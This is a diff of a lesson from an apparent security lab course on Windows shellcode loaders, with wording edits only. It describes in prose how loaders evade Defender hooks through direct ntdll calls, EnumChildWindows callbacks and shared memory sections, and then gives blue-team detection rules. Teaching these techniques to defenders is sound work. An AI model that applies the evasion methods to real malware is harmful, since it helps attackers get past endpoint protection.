-Instead of calling VirtualAlloc from kernel32.dll, you can call NtAllocateVirtualMemory from ntdll.dll. This skips kernel32.dll entirely. Since Defender places its hooks inside kernel32.dll functions, calling ntdll.dll directly bypasses those hooks. Document 07 covers this in full.
+Instead of calling VirtualAlloc from kernel32.dll, you can call NtAllocateVirtualMemory from ntdll.dll. This skips kernel32.dll entirely. Defender places its hooks inside kernel32.dll functions, so calling ntdll.dll bypasses those hooks. Document 07 covers this in full.
 
 ### Variation 2: Callback Functions Instead of CreateThread
 
-CreateThread is a function Defender watches closely. Some loaders avoid calling CreateThread by using Windows functions that accept a callback. A callback is a function address that Windows calls for you. For example, the function `EnumChildWindows` accepts a function address and calls it for every window on screen. If you pass your shellcode's address as the callback, Windows calls your shellcode without you ever calling CreateThread. Defender has a harder time detecting this because EnumChildWindows is used by many legitimate programs.
+CreateThread is a function Defender watches closely. Some loaders avoid CreateThread by using Windows functions that accept a callback. A callback is a function address that Windows calls for you. For example, `EnumChildWindows` accepts a function address and calls it for every window on screen. If you pass your shellcode's address as the callback, Windows calls your shellcode without you ever calling CreateThread. Defender has a harder time detecting this because EnumChildWindows is used by many legitimate programs.
 
 ### Variation 3: Replacing WriteProcessMemory
 
-WriteProcessMemory is heavily monitored. Some loaders use NtWriteVirtualMemory from ntdll.dll instead, or they map a shared memory section between two processes and write to it through the shared mapping. Both approaches achieve the same result (getting bytes into another process) without calling the monitored function.
+WriteProcessMemory is heavily monitored. Some loaders use NtWriteVirtualMemory from ntdll.dll instead, or they use shared memory sections (a feature where two programs share a section of RAM) to move data between processes without calling WriteProcessMemory at all.
 
 ## Detection and Defense (Blue Team Perspective)
 
-**Import table analysis.** When a .NET binary is compiled with DllImport declarations, those function names appear in the binary's import table. YARA rules can match binaries that import suspicious combinations like VirtualAlloc + CreateThread + WriteProcessMemory. Florian Roth's YARA rule repository contains rules for known offensive .NET tools.
+**Import table analysis.** When a .NET binary is compiled with DllImport declarations, those function names appear in the file's import table. YARA rules can scan binaries for suspicious combinations like VirtualAlloc + CreateThread + WriteProcessMemory. Florian Roth's YARA rule repository contains rules for known offensive .NET tool patterns.
 
-Blue team action: scan all new .NET executables for suspicious import combinations. Alert on binaries that import injection-related APIs.
+Blue team action: scan all new .NET executables for suspicious import table combinations. Alert on binaries that import injection-related API functions.
 
-**API hook monitoring.** EDR products hook functions like VirtualAlloc and CreateThread inside kernel32.dll. Every call is logged with its parameters: how much memory was requested, what permissions were set, which address the new thread starts at. When a program allocates executable memory and starts a thread at that address, the EDR generates an alert.
+**API hook monitoring.** EDR (Endpoint Detection and Response) products hook functions like VirtualAlloc and CreateThread inside kernel32.dll. Every call is logged with its parameters: how much RAM was requested, what permissions were set, what address the new thread starts at. A program that requests executable RAM and starts a thread at that address triggers an alert.
 
-Blue team action: configure EDR to alert when VirtualAlloc is called with executable permissions (0x20, 0x40) followed by CreateThread with a start address in that allocation.
+Blue team action: configure EDR to alert when VirtualAlloc is called with executable permissions followed by CreateThread with a start address in the allocated section.
 
-**Memory permission change detection.** Legitimate programs rarely call VirtualProtect to add execute permission to a memory region. A program that allocates memory as read-write, writes data into it, then changes it to executable is following the shellcode injection pattern.
+**RAM permission change detection.** Legitimate programs rarely call VirtualProtect to add execute permission to existing RAM. A program that writes data into RAM and then changes that RAM to executable is following the shellcode injection pattern.
 
-Blue team action: monitor VirtualProtect calls that add execute permission. Alert when a process changes memory from writable to executable.
+Blue team action: monitor VirtualProtect calls that add execute permission. Alert when a process changes RAM from writable to executable.
 
-**Dynamic resolution detection.** Programs that call GetProcAddress to find VirtualAlloc or CreateThread are using a technique common in malware. Legitimate programs typically import these functions directly with their compiler's import mechanism.
+**Dynamic resolution detection.** Programs that call GetProcAddress to find VirtualAlloc or CreateThread at runtime are using a technique common in malware. Legitimate programs typically declare their imports at compile time.
 
-Blue team action: log GetProcAddress calls and flag when the resolved function name is VirtualAlloc, CreateThread, WriteProcessMemory, or other injection-related functions.
+Blue team action: log GetProcAddress calls and flag when the function name being resolved is VirtualAlloc, CreateThread, WriteProcessMemory, or other injection-related functions.
 
 ## What Comes Next
 
-Document 04 (lab/materials/04_memory_fundamentals.md) goes deeper into how Windows manages memory. You will learn what virtual memory is, what pages and permissions are, how each process gets its own address space, and the difference between local memory operations and remote memory operations. This gives you the foundation for understanding exactly what happens when VirtualAlloc and WriteProcessMemory run.
+Document 04 (lab/materials/04_memory_fundamentals.md) goes deeper into how Windows manages RAM. You will learn what virtual memory is (how Windows gives every program its own private address space even when they all share the same physical RAM), what pages are (how Windows divides RAM into fixed-size blocks), how page permissions work, and the difference between working with your own program's RAM and another program's RAM. This gives you the deeper understanding of what VirtualAlloc and WriteProcessMemory are actually doing when the loaders call them.
